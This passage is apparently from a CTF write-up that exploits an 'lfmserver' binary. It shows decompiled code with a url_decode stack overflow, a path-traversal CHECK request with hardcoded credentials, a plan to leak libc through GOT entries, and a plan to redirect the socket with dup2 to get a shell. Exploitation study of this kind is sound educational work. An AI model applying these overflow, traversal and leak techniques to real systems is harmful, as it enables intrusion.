+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">handle_check</span><span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="n">message</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">uint</span> <span class="n">uVar1</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">user_ok</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">pw_ok</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">file_ok</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">iVar2</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">res_send_header</span><span class="p">;</span>
+  <span class="kt">size_t</span> <span class="n">sVar3</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">__s1</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">uVar4</span><span class="p">;</span>
+  <span class="n">uint</span> <span class="o">**</span><span class="n">__s</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">uVar5</span><span class="p">;</span>
+  <span class="n">uint</span> <span class="o">*</span><span class="n">apuStack192</span> <span class="p">[</span><span class="mi">3</span><span class="p">];</span>
+  <span class="kt">char</span> <span class="n">filename</span> <span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+
+  <span class="n">apuStack192</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">message</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">message</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">apuStack192</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">message</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">message</span> <span class="o">+</span> <span class="mh">0x16</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+     <span class="p">)</span> <span class="p">{</span>
+    <span class="n">apuStack192</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x403b30</span><span class="p">;</span>
+    <span class="n">apuStack192</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">message</span><span class="p">;</span>
+    <span class="n">user_ok</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">message</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">),</span><span class="n">lfmserver_user</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">user_ok</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">apuStack192</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x403b55</span><span class="p">;</span>
+      <span class="n">pw_ok</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">apuStack192</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x16</span><span class="p">),</span><span class="o">!</span><span class="n">gby0l0r0ck</span><span class="err">$$</span><span class="o">!</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">pw_ok</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">apuStack192</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x403b70</span><span class="p">;</span>
+        <span class="n">sVar3</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">apuStack192</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">));</span>
+        <span class="n">apuStack192</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x403b92</span><span class="p">;</span>
+        <span class="n">url_decode</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">apuStack192</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">),</span><span class="n">filename</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">sVar3</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="n">apuStack192</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x403ba6</span><span class="p">;</span>
+        <span class="n">file_ok</span> <span class="o">=</span> <span class="n">access</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">file_ok</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">apuStack192</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x403bcb</span><span class="p">;</span>
+          <span class="n">system_log</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="s">"404 NOT FOUND: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">filename</span><span class="p">);</span>
+          <span class="n">apuStack192</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x403bdb</span><span class="p">;</span>
+          <span class="n">send_404</span><span class="p">(</span><span class="o">*</span><span class="n">apuStack192</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+          <span class="n">apuStack192</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x403bfb</span><span class="p">;</span>
+          <span class="p">(</span><span class="o">*</span><span class="n">DAT_00409430</span><span class="p">)((</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="n">apuStack192</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="s">"file does not exist [HEAD]"</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
+                          <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="n">apuStack192</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+          <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">apuStack192</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x403c14</span><span class="p">;</span>
+        <span class="n">__s1</span> <span class="o">=</span> <span class="n">md5sum</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">__s1</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">apuStack192</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x403c2f</span><span class="p">;</span>
+          <span class="n">send_500</span><span class="p">(</span><span class="o">*</span><span class="n">apuStack192</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+          <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">uVar5</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">apuStack192</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">);</span>
+        <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">apuStack192</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">apuStack192</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x403c71</span><span class="p">;</span>
+        <span class="n">iVar2</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">__s1</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">apuStack192</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mi">6</span><span class="p">));</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">iVar2</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">apuStack192</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x403d7c</span><span class="p">;</span>
+          <span class="n">system_log</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="s">"406 MD5 NOT MATCH: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">uVar5</span><span class="p">);</span>
+          <span class="n">apuStack192</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x403d93</span><span class="p">;</span>
+          <span class="n">send_406</span><span class="p">(</span><span class="o">*</span><span class="n">apuStack192</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="n">__s1</span><span class="p">);</span>
+          <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">apuStack192</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x403c97</span><span class="p">;</span>
+        <span class="n">res_send_header</span> <span class="o">=</span> <span class="n">send_header</span><span class="p">(</span><span class="mi">200</span><span class="n">_OK</span><span class="p">,</span><span class="n">apuStack192</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">res_send_header</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+          <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">apuStack192</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x403cb2</span><span class="p">;</span>
+        <span class="n">sVar3</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">__s1</span><span class="p">);</span>
+        <span class="n">uVar4</span> <span class="o">=</span> <span class="p">(</span><span class="n">sVar3</span> <span class="o">+</span> <span class="mh">0x1c</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x10</span><span class="p">;</span>
+        <span class="n">__s</span> <span class="o">=</span> <span class="n">apuStack192</span> <span class="o">+</span> <span class="n">uVar4</span> <span class="o">*</span> <span class="mh">0x1ffffffffffffffe</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
+        <span class="n">apuStack192</span><span class="p">[</span><span class="n">uVar4</span> <span class="o">*</span> <span class="mh">0x1ffffffffffffffe</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x403cf9</span><span class="p">;</span>
+        <span class="n">sVar3</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">__s1</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)(</span><span class="n">apuStack192</span> <span class="o">+</span> <span class="n">uVar4</span> <span class="o">*</span> <span class="mh">0x1ffffffffffffffe</span><span class="p">));</span>
+        <span class="n">apuStack192</span><span class="p">[</span><span class="n">uVar4</span> <span class="o">*</span> <span class="mh">0x1ffffffffffffffe</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x403d1c</span><span class="p">;</span>
+        <span class="n">snprintf</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">__s</span><span class="p">,</span><span class="n">sVar3</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span><span class="s">"%s</span><span class="se">\r\n\r\n</span><span class="s">"</span><span class="p">,</span><span class="n">__s1</span><span class="p">);</span>
+        <span class="n">apuStack192</span><span class="p">[</span><span class="n">uVar4</span> <span class="o">*</span> <span class="mh">0x1ffffffffffffffe</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x403d28</span><span class="p">;</span>
+        <span class="n">sVar3</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">__s</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)(</span><span class="n">apuStack192</span> <span class="o">+</span> <span class="n">uVar4</span> <span class="o">*</span> <span class="mh">0x1ffffffffffffffe</span><span class="p">));</span>
+        <span class="n">uVar1</span> <span class="o">=</span> <span class="o">*</span><span class="n">apuStack192</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+        <span class="n">apuStack192</span><span class="p">[</span><span class="n">uVar4</span> <span class="o">*</span> <span class="mh">0x1ffffffffffffffe</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x403d42</span><span class="p">;</span>
+        <span class="n">uVar5</span> <span class="o">=</span> <span class="n">write_message</span><span class="p">(</span><span class="n">uVar1</span><span class="p">,</span><span class="n">__s</span><span class="p">,</span><span class="n">sVar3</span><span class="p">,</span>
+                              <span class="o">*</span><span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)(</span><span class="n">apuStack192</span> <span class="o">+</span> <span class="n">uVar4</span> <span class="o">*</span> <span class="mh">0x1ffffffffffffffe</span><span class="p">));</span>
+        <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar5</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+          <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">apuStack192</span><span class="p">[</span><span class="n">uVar4</span> <span class="o">*</span> <span class="mh">0x1ffffffffffffffe</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x403d58</span><span class="p">;</span>
+        <span class="n">log_info</span><span class="p">(</span><span class="s">"Couldn</span><span class="se">\'</span><span class="s">t send md5sum [handle_check]"</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="n">apuStack192</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x403db1</span><span class="p">;</span>
+  <span class="n">send_401</span><span class="p">(</span><span class="o">*</span><span class="n">apuStack192</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>The handle check function calls the <code class="language-plaintext highlighter-rouge">url_decode</code> function, using a 128 byte large buffer.</p>
+
+<h3 id="url_decode-fun_00402db9">url_decode (FUN_00402db9)</h3>
+<p>The url_decode function is vulnerable and can be used to overflow the 128 byte buffer.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">url_decode</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">,</span><span class="kt">int</span> <span class="n">max</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">ulong</span> <span class="n">res</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">local_max</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_dest</span><span class="p">;</span>
+  <span class="n">undefined2</span> <span class="n">nptr</span><span class="p">;</span>
+  <span class="n">undefined</span> <span class="n">local_11</span><span class="p">;</span>
+  <span class="n">undefined2</span> <span class="o">*</span><span class="n">local_src</span><span class="p">;</span>
+
+  <span class="n">local_11</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">local_max</span> <span class="o">=</span> <span class="n">max</span><span class="p">;</span>
+  <span class="n">local_dest</span> <span class="o">=</span> <span class="n">dest</span><span class="p">;</span>
+  <span class="n">local_src</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined2</span> <span class="o">*</span><span class="p">)</span><span class="n">src</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">((</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">local_src</span> <span class="o">!=</span> <span class="sc">'\0'</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">local_max</span> <span class="o">=</span> <span class="n">local_max</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">local_max</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)))</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">local_src</span> <span class="o">==</span> <span class="sc">'%'</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">local_src</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined2</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">local_src</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+      <span class="n">nptr</span> <span class="o">=</span> <span class="o">*</span><span class="n">local_src</span><span class="p">;</span>
+      <span class="n">res</span> <span class="o">=</span> <span class="n">strtoul</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">nptr</span><span class="p">,(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
+      <span class="o">*</span><span class="n">local_dest</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">res</span><span class="p">;</span>
+      <span class="n">local_dest</span> <span class="o">=</span> <span class="n">local_dest</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="n">local_src</span> <span class="o">=</span> <span class="n">local_src</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="o">*</span><span class="n">local_dest</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">local_src</span><span class="p">;</span>
+      <span class="n">local_dest</span> <span class="o">=</span> <span class="n">local_dest</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="n">local_src</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined2</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">local_src</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="o">*</span><span class="n">local_dest</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="exploiting-the-binary">Exploiting the binary</h2>
+<p>Now that we have gathered enough information about the binary, let us prepare to exploit the binary.</p>
+<h3 id="exploit-preperation">Exploit preperation</h3>
+<p>In order to exploit the binary we have to preperate a few things. We will need to have a copy of the used libc version. Furthermore, we will need a way to url-encode all characters in python and get a MD5-sum of a file from the server. After we have prepared all of that, we need to find a way to leak an address from libc to calculate the libc-base and then finally redirect stdin, stdout and stderr to the socket, which needs to be brute forced.</p>
+
+<h4 id="getting-libc">Getting libc</h4>
+<p>Using <a href="https://github.com/niklasb/libc-database">libc-database</a> we can download the libc version used on the server.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~# libc-database/download libc6_2.28-0ubuntu1_amd64
+Getting libc6_2.28-0ubuntu1_amd64
+  -&gt; Location: http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc//libc6_2.28-0ubuntu1_amd64.deb
+  -&gt; Downloading package
+  -&gt; Extracting package
+  -&gt; Package saved to libs/libc6_2.28-0ubuntu1_amd64
+
+root@silence:~# <span class="nb">cp </span>libc-database/libs/libc6_2.28-0ubuntu1_amd64/libc.so.6 <span class="nb">.</span>
+</code></pre></div></div>
+
+<h4 id="url-encoding-all-characters">URL-encoding all characters</h4>
+<p>In order to send the payload successfully, we have to url-encode <strong>all characters</strong>. Default python url-encoding does only encode certain key-characters. Luckily after a bit of searching, I found a <a href="https://gist.github.com/Paradoxis/6336c2eaea20a591dd36bb1f5e227da2#file-url_encode-py">script on GitHub</a> that encodes all characters.</p>
+
+<h4 id="md5-sum-of-file">MD5-sum of file</h4>
+<p>Another prerequisite for our exploit, is that we know the MD5-sum of the file we are accessing. There are multiple possible files we can choose from. Initially I decided to use <code class="language-plaintext highlighter-rouge">/dev/null</code>, as it will definitly has the same MD5-sum on my machine as on the target. However, because of problems that occured in later exploit-development I changed to use <code class="language-plaintext highlighter-rouge">/proc/sys/kernel/randomize_va_space</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~# <span class="nb">md5sum</span> /dev/null
+d41d8cd98f00b204e9800998ecf8427e  /dev/null
+
+root@silence:~# <span class="nb">md5sum</span> /proc/sys/kernel/randomize_va_space
+26ab0db90d72e28ad0ba1e22ee510510  /proc/sys/kernel/randomize_va_space
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Request</span><span class="p">:</span>
+<span class="n">CHECK</span> <span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">%</span><span class="mi">2</span><span class="n">e</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="n">LFM</span>
+<span class="n">User</span><span class="o">=</span><span class="n">lfm_user</span>
+<span class="n">Password</span><span class="o">=</span><span class="err">!</span><span class="n">gby0l0r0ck</span><span class="err">$$!</span>
+
+<span class="n">d41d8cd98f00b204e9800998ecf8427e</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Response</span><span class="p">:</span>
+<span class="n">LFM</span> <span class="mi">200</span> <span class="n">OK</span>
+<span class="n">Size</span><span class="p">:</span> <span class="mi">32</span>
+</code></pre></div></div>
+
+<h4 id="leaking-libc-base">Leaking libc-base</h4>
+<p>We can use write to leak any libc function and calculate the offset.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~# objdump <span class="nt">-D</span> lfmserver <span class="nt">-M</span> intel | <span class="nb">grep</span> <span class="s2">"write"</span>
+0000000000402420 &lt;write@plt&gt;:
+  4025d7:       e8 44 fe ff ff          call   402420 &lt;write@plt&gt;
+</code></pre></div></div>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="err">@</span><span class="n">silence</span><span class="o">:~</span><span class="err">#</span> <span class="n">man</span> <span class="mi">2</span> <span class="n">write</span>
+<span class="nf">WRITE</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>                                     <span class="n">Linux</span> <span class="n">Programmer</span><span class="err">'</span><span class="n">s</span> <span class="n">Manual</span>                                     <span class="n">WRITE</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">NAME</span>
+       <span class="n">write</span> <span class="o">-</span> <span class="n">write</span> <span class="n">to</span> <span class="n">a</span> <span class="n">file</span> <span class="n">descriptor</span>
+
+<span class="n">SYNOPSIS</span>
+       <span class="cp">#include &lt;unistd.h&gt;
+</span>
+       <span class="kt">ssize_t</span> <span class="n">write</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">);</span>
+<span class="p">[...]</span>
+</code></pre></div></div>
+<p>In order to leak any libc function, we have to define where to write to, what to write and how long the data will be. Our connection socket is not known, however we can guess it. The address is 8 bytes long.</p>
+
+<p>Let us check which functions we can leak:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">silence</span><span class="p">:</span><span class="o">~</span><span class="c1"># python3
+</span><span class="n">Python</span> <span class="mf">3.8.3</span><span class="n">rc1</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">Apr</span> <span class="mi">30</span> <span class="mi">2020</span><span class="p">,</span> <span class="mi">07</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">30</span><span class="p">)</span>
+<span class="p">[</span><span class="n">GCC</span> <span class="mf">9.3.0</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux</span>
+<span class="n">Type</span> <span class="s">"help"</span><span class="p">,</span> <span class="s">"copyright"</span><span class="p">,</span> <span class="s">"credits"</span> <span class="ow">or</span> <span class="s">"license"</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="o">.</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./lfmserver'</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so.6'</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="k">for</span> <span class="n">got</span> <span class="ow">in</span> <span class="n">binary</span><span class="o">.</span><span class="n">got</span><span class="p">:</span>
+<span class="o">...</span>     <span class="k">for</span> <span class="n">lib</span> <span class="ow">in</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">:</span>
+<span class="o">...</span>             <span class="k">if</span> <span class="n">got</span> <span class="o">==</span> <span class="n">lib</span><span class="p">:</span>
+<span class="o">...</span>                     <span class="k">print</span><span class="p">(</span><span class="n">got</span><span class="p">)</span>
+<span class="o">...</span>
+<span class="n">_libc_start_main</span>
+<span class="n">stderr</span>
+<span class="n">stdout</span>
+<span class="n">dup2</span>
+<span class="n">pause</span>
+<span class="n">memset</span>
+<span class="n">snprintf</span>
+<span class="n">close</span>
+<span class="n">pthread_cond_signal</span>
+<span class="n">htons</span>
+<span class="n">openlog</span>
+<span class="nb">exit</span>
+<span class="n">strcasecmp</span>
+<span class="n">read</span>
+<span class="n">strncmp</span>
+<span class="n">malloc</span>
+<span class="n">fopen</span>
+</code></pre></div></div>
+<p>We have a lot of functions to choose from. Let us just use dup2, as it is the first function that is listed.</p>
+
+<h4 id="redirecting-stdin-stdout-and-stderr-to-the-socket">Redirecting stdin, stdout and stderr to the socket</h4>
+<p>Using dup2 we can redirect stdin, stdout and stderr to the socket.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="err">@</span><span class="n">silence</span><span class="o">:~</span><span class="err">#</span> <span class="n">man</span> <span class="mi">2</span> <span class="n">dup2</span>
+<span class="nf">DUP</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>                                       <span class="n">Linux</span> <span class="n">Programmer</span><span class="err">'</span><span class="n">s</span> <span class="n">Manual</span>                                       <span class="n">DUP</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">NAME</span>
+       <span class="n">dup</span><span class="p">,</span> <span class="n">dup2</span><span class="p">,</span> <span class="n">dup3</span> <span class="o">-</span> <span class="n">duplicate</span> <span class="n">a</span> <span class="n">file</span> <span class="n">descriptor</span>
+
+<span class="n">SYNOPSIS</span>
